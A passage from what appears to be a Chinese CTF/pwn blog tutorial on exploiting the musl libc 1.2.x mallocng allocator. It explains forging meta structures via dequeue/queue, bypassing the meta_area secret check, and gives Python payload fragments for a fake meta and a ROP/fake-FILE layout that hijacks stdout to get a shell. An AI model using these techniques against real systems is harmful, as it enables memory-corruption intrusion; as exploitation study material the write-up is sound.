dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">            <span class="comment">//.....</span></span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">	&#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">        <span class="comment">//.....</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>🔺注：这个<code>last_idx</code>随便改的话可能会在<code>__libc_free</code>中出现错误，就是一个依据<code>last_idx</code>判断<code>chunk</code>上某个位置是否为0，这个也比较好改</p>
</li>
</ul>
<p>总体来说进入<code>dequeue</code>就算成功，实现任意地址任意写，将<code>__stdout_used</code>的值劫持为<code>fake_IO_addr</code>。之后就大多通过调用链<code>exit()-&gt;__stdio_exit()-&gt;close_file()-&gt;(f-&gt;write(f,0,0))</code>，跳转到<code>gadget</code>完成栈劫持利用的。</p>

        <h5 id="b-queue"   >
          <a href="#b-queue" class="heading-link"><i class="fas fa-link"></i></a><a href="#b-queue" class="headerlink" title="b.queue"></a>b.queue</h5>
      <p>调用链为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_libc_free-&gt;nontrivial_free-&gt;queue</span><br></pre></td></tr></table></div></figure>

<p>看一下<code>nontrivial_free</code>源代码就能理解，就是通过条件满足</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.2 /src/malloc/mallocng/free.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct mapinfo <span class="title">nontrivial_free</span><span class="params">(struct meta *g, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="keyword">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//通过适当计算进行设置,0x7e+1 == (2&lt;&lt;1)-1 == 127</span></span><br><span class="line">    <span class="comment">//ok_to_free就是做一些检查,满足freeable==1,sizeclass&lt;48,maplen==1</span></span><br><span class="line">    <span class="comment">//然后通过g-&gt;next!=g来返回1</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//v1.2.2  /src/malloc/mallocng/free.c</span></span><br><span class="line"><span class="comment">static int okay_to_free(struct meta *g)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	int sc = g-&gt;sizeclass;</span></span><br><span class="line"><span class="comment">	if (!g-&gt;freeable) return 0;</span></span><br><span class="line"><span class="comment">	if (sc &gt;= 48 || get_stride(g) &lt; UNIT*size_classes[sc])</span></span><br><span class="line"><span class="comment">		return 1;</span></span><br><span class="line"><span class="comment">	if (!g-&gt;maplen) return 1;</span></span><br><span class="line"><span class="comment">	if (g-&gt;next != g) return 1;</span></span><br><span class="line"><span class="comment">	if (!is_bouncing(sc)) return 1;</span></span><br><span class="line"><span class="comment">	size_t cnt = g-&gt;last_idx+1;</span></span><br><span class="line"><span class="comment">	size_t usage = ctx.usage_by_class[sc];</span></span><br><span class="line"><span class="comment">	if (9*cnt &lt;= usage &amp;&amp; cnt &lt; 20)</span></span><br><span class="line"><span class="comment">		return 1;</span></span><br><span class="line"><span class="comment">	return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">	&#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>依照相关逻辑，伪造<code>meta</code>如下</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">last_idx, freeable, sc, maplen = <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span> <span class="comment">#freeable置0是为了拒绝ok to free校验，防止释放meta</span></span><br><span class="line">fake_meta = p64(<span class="number">0</span>)                              <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>)                             <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(base)                 			<span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>) + p32(<span class="number">0</span>)                    <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((maplen &lt;&lt; <span class="number">12</span>) | (sc &lt;&lt; <span class="number">6</span>) | (freeable &lt;&lt; <span class="number">5</span>) | last_idx)</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br></pre></td></tr></table></div></figure>

<p>这里相关参数设置的是和<code>dequeue</code>差不多，不太一样的主要是<code>freeable</code>、<code>prev</code>、<code>next</code>、<code>avail_mask</code>、<code>freed_mask</code>、<code>maplen</code>等的设置，同样也是为了通过<code>get_meta</code>以及相关的检测</p>
<p>这样在<code>queue</code>之后就能在对应的<code>active[sc]</code>中得到一个<code>fake_meta</code>，随后通过任意写<code>faka_meta-&gt;mem</code>即可进行任意申请。</p>
<p>如果使用<code>calloc</code>进行申请，则还需要在<code>base-&gt;meta</code>位置通过<code>dequeue</code>写入<code>fake_meta_addr</code>才行。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.2 /src/malloc/calloc.c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">calloc</span><span class="params">(<span class="keyword">size_t</span> m, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">	n *= m;</span><br><span class="line">	<span class="keyword">void</span> *p = <span class="built_in">malloc</span>(n);</span><br><span class="line">	<span class="keyword">if</span> (!p || (!__malloc_replaced &amp;&amp; __malloc_allzerop(p)))</span><br><span class="line">		<span class="keyword">return</span> p;</span><br><span class="line">	n = mal0_clear(p, n);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">memset</span>(p, <span class="number">0</span>, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>因为在进入<code>calloc</code>之后，如果申请出<code>chunk</code>则会进入检测<code>__malloc_allzerop</code>这个函数，而在<code>musl</code>中即为<code>get_meta</code>，会对<code>meta</code>进行检测</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230822205832570.png" alt="image-20230822205832570"></p>
<p>通过<code>malloc</code>进行申请的则不用在<code>base-&gt;meta</code>位置通过<code>dequeue</code>写入<code>fake_meta_addr</code>，可以直接申请出来。</p>
<p>随后就可以通过修改<code>__stdout_FILE</code>结构体，在没有<code>exit</code>的情况下，就可以通过<code>puts-&gt;fputs_unlocked-&gt;fwrite_unlocked-&gt;__fwritex-&gt;(f-&gt;write)</code>调用链来调用到虚假的<code>f-&gt;write</code>函数指针，随后通过<code>gadget</code>劫持栈完成利用，和之前的<code>dequeue</code>类似。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.2 /src/stdio/fwrite.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> __fwritex(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="keyword">restrict</span> s, <span class="keyword">size_t</span> l, FILE *<span class="keyword">restrict</span> f)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">size_t</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	<span class="keyword">if</span> (l &gt; f-&gt;wend - f-&gt;wpos) <span class="keyword">return</span> f-&gt;write(f, s, l);</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	<span class="keyword">return</span> l+i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>注：当然，也可以通过<code>dequeue</code>直接修改某个<code>active[sc]</code>的<code>mem</code>来申请到<code>__stdout_FILE</code>进行修改，但是这个需要写了<code>ELF</code>基地址得到<code>meta</code>地址，还需要<code>malloc</code>进行申请才行。</p>
<p>另外当用<code>malloc</code>申请<code>chunk</code>时，如果可以泄露<code>heap</code>基地址，那么就可以通过任意修改<code>active[sz]-&gt;mem</code>进行任意申请，但是申请到的位置在不同的<code>active[sc]</code>中不太一样，具体的进行分析。<code>calloc</code>存在<code>get_meta</code>相关的校验。</p>

        <h4 id="③触发伪造meta"   >
          <a href="#③触发伪造meta" class="heading-link"><i class="fas fa-link"></i></a><a href="#③触发伪造meta" class="headerlink" title="③触发伪造meta"></a>③触发伪造meta</h4>
      <p>那么如何通过释放触发伪造的<code>meta</code>呢。这个在<code>get_meta</code>中有</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> offset = *(<span class="keyword">const</span> <span class="keyword">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line"><span class="keyword">int</span> index = get_slot_index(p);</span><br><span class="line"><span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">    assert(!offset);</span><br><span class="line">    offset = *(<span class="keyword">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">    assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="keyword">const</span> <span class="keyword">void</span> *)(p - UNIT*offset - UNIT);</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br></pre></td></tr></table></div></figure>

<p>即依据<code>chunk</code>元数据里面的<code>idx/offset</code>来得到<code>base</code>，从而得到<code>meta</code>，那么通常的漏洞利用就是通过溢出写<code>chunk</code>的元数据，使之成为第<code>0</code>个<code>chunk</code>，从而获取到伪造的<code>meta</code>。如下即通过溢出chunk使之索引为0，在<code>chunk_addr-0x10</code>部分伪造<code>meta</code>，之后释放该<code>chunk</code>，发现索引为0，即可从<code>chunk_addr-0x10</code>的地方找到伪造的<code>meta</code>地址。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230817192343088.png" alt="image-20230817192343088"></p>

        <h4 id="④绕过检测"   >
          <a href="#④绕过检测" class="heading-link"><i class="fas fa-link"></i></a><a href="#④绕过检测" class="headerlink" title="④绕过检测"></a>④绕过检测</h4>
      <p>在实际利用时，还需要绕过<code>get_meta</code>中对于<code>meta_area</code>的检测</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="keyword">void</span> *)((<span class="keyword">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">assert(area-&gt;check == ctx.secret);</span><br></pre></td></tr></table></div></figure>

<p>即通过<code>meta</code>所在页得到<code>meta_area</code>，然后检测<code>ctx.secret</code>是否为<code>meta_area-&gt;check</code>。那么在利用时其实不一定能满足申请到的<code>chunk</code>在<code>0x---000</code>的位置，那么通常就申请<code>0x2000</code>的<code>chunk</code>来得到<code>libc</code>上的<code>chunk</code>，并且通过适当调整使得<code>fake_meta</code>所在页的首地址数据为<code>secret</code>。那么通常的payload配置如下</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += rop</span><br><span class="line">payload = payload.ljust(<span class="number">0xfe0</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += binsh</span><br><span class="line">payload += fake_IO</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230822221035821.png" alt="image-20230822221035821"></p>
<p>参考：</p>
<p>[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274640.htm#msg_header_h3_1" >原创]小小做题家之——musl 1.2.2的利用手法-Pwn-看雪-安全社区|安全招聘|kanxue.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-269533-1.htm#msg_header_h3_7" >原创]musl 1.2.2 总结+源码分析 One-Pwn-看雪-安全社区|安全招聘|kanxue.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/252293#h2-13" >新版musl-libc malloc源码分析与调试-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202253" >从一次 CTF 出题谈 musl libc 堆漏洞利用-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241101#h2-6" >借助DefCon Quals 2021的mooosl学习musl mallocng（源码审计篇）-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/251832" >从2021 WMCTF Nescafe学习musl libc UAF 利用-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241104#h2-0" >借助DefCon Quals 2021的mooosl学习musl mallocng（漏洞利用篇）-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/246929#h2-5" >musl-1.2.x堆部分源码分析-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253566#h2-8" >从musl libc 1.1.24到1.2.2 学习pwn姿势-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10326#toc-4" >musl 1.2.2 总结+源码分析 One - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2022/01/22/Musl%E4%BB%8E0%E5%BC%80%E5%A7%8B/">http://pig-007.github.io/2022/01/22/Musl%E4%BB%8E0%E5%BC%80%E5%A7%8B/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/Musl/">Musl</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/02/09/%E8%A7%A3%E9%87%8A%E5%99%A8PWN/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">解释器PWN</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/01/17/HWS%E7%A1%AC%E4%BB%B6%E5%AD%A6%E4%B9%A0/"><span class="paginator-prev__text">2021HWS固件学习</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%811-2-0%E5%8F%8A%E4%BB%A5%E5%89%8D%E7%89%88%E6%9C%AC"><span class="toc-text">
          一、1.2.0及以前版本</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="toc-text">
          1.数据结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-chunk%E7%BB%93%E6%9E%84"><span class="toc-text">
          (1)chunk结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%A0%86%E7%AE%A1%E7%90%86%E7%BB%93%E6%9E%84mal"><span class="toc-text">
          (2)堆管理结构mal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-bitmap"><span class="toc-text">
          (3)bitmap:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-bins"><span class="toc-text">
          (4)bins</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%BB%B4%E6%8A%A4%E6%96%B9%E5%BC%8F"><span class="toc-text">
          2.维护方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0"><span class="toc-text">
          3.关键函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-mallco"><span class="toc-text">
          (1)mallco</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-text">
          详细步骤：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0unbin"><span class="toc-text">
          ①unbin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1pretrim"><span class="toc-text">
          ②pretrim</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2trim"><span class="toc-text">
          ③trim</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-free"><span class="toc-text">
          (2)free</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0unmap-chunk"><span class="toc-text">
          ①unmap_chunk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-bin-chunk"><span class="toc-text">
          ②__bin_chunk</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E9%9D%99%E6%80%81%E5%A0%86%E5%86%85%E5%AD%98"><span class="toc-text">
          4.静态堆内存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">
          5.利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="toc-text">
          (1)泄露地址</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%9F%BA%E4%BA%8E%E9%9D%99%E6%80%81%E5%A0%86%E5%86%85%E5%AD%98"><span class="toc-text">
          ①基于静态堆内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E5%9F%BA%E4%BA%8Ebins"><span class="toc-text">
          ②基于bins</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-getshell"><span class="toc-text">
          (2)getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0UAF"><span class="toc-text">
          ①UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-text">
          方法一：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-text">
          方法二：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A"><span class="toc-text">
          方法三：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1off-by-one"><span class="toc-text">
          ②off-by-one</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%AA%E5%90%88%E5%B9%B6%E5%89%8D%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">
          未合并前如下：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E5%B9%B6%E5%90%8E%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">
          合并后如下：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%811-2-1%E5%8F%8A%E4%B9%8B%E5%90%8E%E7%89%88%E6%9C%AC"><span class="toc-text">
          二、1.2.1及之后版本</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-1"><span class="toc-text">
          1.数据结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-chunk%E7%BB%93%E6%9E%84-1"><span class="toc-text">
          (1)chunk结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-group"><span class="toc-text">
          (2)group</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-meta"><span class="toc-text">
          (3)meta</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-meta-area"><span class="toc-text">
          (4)meta_area</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-malloc-context"><span class="toc-text">
          (5)malloc_context</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%BB%B4%E6%8A%A4%E6%96%B9%E5%BC%8F-1"><span class="toc-text">
          2.维护方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0-1"><span class="toc-text">
          3.关键函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-malloc"><span class="toc-text">
          (1)malloc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%BA%E6%B3%A8%EF%BC%9A"><span class="toc-text">
          🔺注：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0alloc-slot"><span class="toc-text">
          ①alloc_slot</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1try-avail"><span class="toc-text">
          ②try_avail</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2alloc-group"><span class="toc-text">
          ③alloc_group</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A3alloc-meta"><span class="toc-text">
          ④alloc_meta</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A4enframe"><span class="toc-text">
          ⑤enframe</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-free-1"><span class="toc-text">
          (2)free</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0nontrivial-free"><span class="toc-text">
          ①nontrivial_free()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1dequeue"><span class="toc-text">
          ②dequeue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2queue"><span class="toc-text">
          ③queue</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E6%B3%A8%EF%BC%9A-1"><span class="toc-text">
          🔺注：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">
          4.利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80-1"><span class="toc-text">
          (1)泄露地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-getshell-1"><span class="toc-text">
          (2)getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0secret"><span class="toc-text">
          ①secret</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E4%BC%AA%E9%80%A0meta"><span class="toc-text">
          ②伪造meta</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#a-dequeue"><span class="toc-text">
          a.dequeue</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#b-queue"><span class="toc-text">
          b.queue</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2%E8%A7%A6%E5%8F%91%E4%BC%AA%E9%80%A0meta"><span class="toc-text">
          ③触发伪造meta</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A3%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B"><span class="toc-text">
          ④绕过检测</span></a></li></ol></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">133</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">83</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">73</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img 